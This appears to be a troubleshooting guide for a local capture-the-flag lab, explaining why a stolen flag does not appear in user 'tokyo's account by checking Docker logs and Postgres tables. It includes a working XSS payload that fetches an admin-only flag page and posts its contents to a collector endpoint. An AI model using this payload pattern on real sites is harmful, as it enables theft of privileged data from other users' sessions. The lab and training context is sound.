# Quick Fix: Flag Not Appearing in Tokyo's Account

## The Issue

Your logs show the flag is being fetched and sent, but it's not appearing in `/my-captures`. This is almost certainly a `user_id` mismatch.

## Quick Diagnostic Commands

Run these commands to find the problem:

### 1. Check What `user_id` the Collector Received

```bash
sudo docker-compose logs web --tail 100 | grep "collector.*Received request"
```

Look for: `user_id=X` - This is what your payload sent.

### 2. Check What's Actually in the Database

```bash
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT user_id, LEFT(data, 50) as flag_preview, captured_at FROM captures ORDER BY id DESC LIMIT 5;"
```

This shows:
- What `user_id` the flag is stored under
- The flag content
- When it was captured

### 3. Check Tokyo's Actual `user_id`

```bash
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT id, username FROM users WHERE username='tokyo';"
```

This shows Tokyo's actual `user_id` in the database.

## The Fix

### If the flag is stored under `user_id=1` but Tokyo's `id` is different:

**Option 1: Update your payload** to use Tokyo's actual `user_id`:
```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: X, data: flag })  // Replace X with Tokyo's actual id
    });
  });
</script>
```

**Option 2: Reset and try again** (if you have admin access):
```bash
# Reset the challenge
curl -X POST http://localhost:5002/admin/reset -b "your_session_cookie"
```

### If the flag is stored under the wrong `user_id`:

The flag is in the database but linked to the wrong user. You need to either:
1. Use the correct `user_id` in your payload
2. Or manually fix the database (if you have access)

### If the flag is already captured (duplicate prevention):

Check the logs:
```bash
sudo docker-compose logs web --tail 100 | grep "Flag already captured"
```

If you see this, the flag IS in your account - just refresh `/my-captures` or logout/login again.

## Most Likely Scenario

Based on your logs, the flag is being sent correctly. The most common issues are:

1. **Wrong `user_id` in payload** - Check what `user_id` the collector received vs Tokyo's actual `id`
2. **Flag already captured** - System prevents duplicates, flag is already there
3. **Session issue** - Try logging out and back in as Tokyo

## Verify It's Working

After fixing, check:

```bash
# 1. Verify flag is stored with correct user_id
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT user_id, data FROM captures WHERE data LIKE 'FLAG{%';"

# 2. Verify Tokyo's user_id
sudo docker-compose exec db psql -U ctf -d ctfdb -c "SELECT id FROM users WHERE username='tokyo';"

# 3. They should match!
```

If `user_id` in captures matches Tokyo's `id`, the flag should appear in `/my-captures`.

